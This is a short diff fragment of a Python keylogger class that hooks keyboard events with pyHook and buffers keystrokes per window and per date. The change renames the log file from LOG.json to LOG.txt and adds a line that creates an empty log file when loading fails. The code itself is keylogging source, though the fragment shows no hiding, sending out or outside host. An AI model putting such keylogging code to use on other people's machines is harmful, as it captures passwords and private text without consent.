@@ -9,13 +9,12 @@ class Logger:
     """
     A basic implementation of a python key logger
     stores logged keys per-window per-date in a json format
-
     full log is stored in mem on a return key or tab key
     the buffer is written to disk.
 
     buffer structure - {date: {windows name: [list of keystrokes]}}
     """
-    LOG_FILE: str = "LOG.json"  # log file path
+    LOG_FILE: str = "LOG.txt"  # log file path
 
     def __init__(self):
         self.hook = hook = pyHook.HookManager()
@@ -26,6 +25,7 @@ class Logger:
             self.buffer[str(date.today())] = dict()  # create new log dict for current date
         except (FileNotFoundError, json.decoder.JSONDecodeError):
             self.buffer = {str(date.today()): dict()}
+            open(self.LOG_FILE, "w").close()
 
     def __write_event(self, event: pyHook.KeyboardEvent):
         """
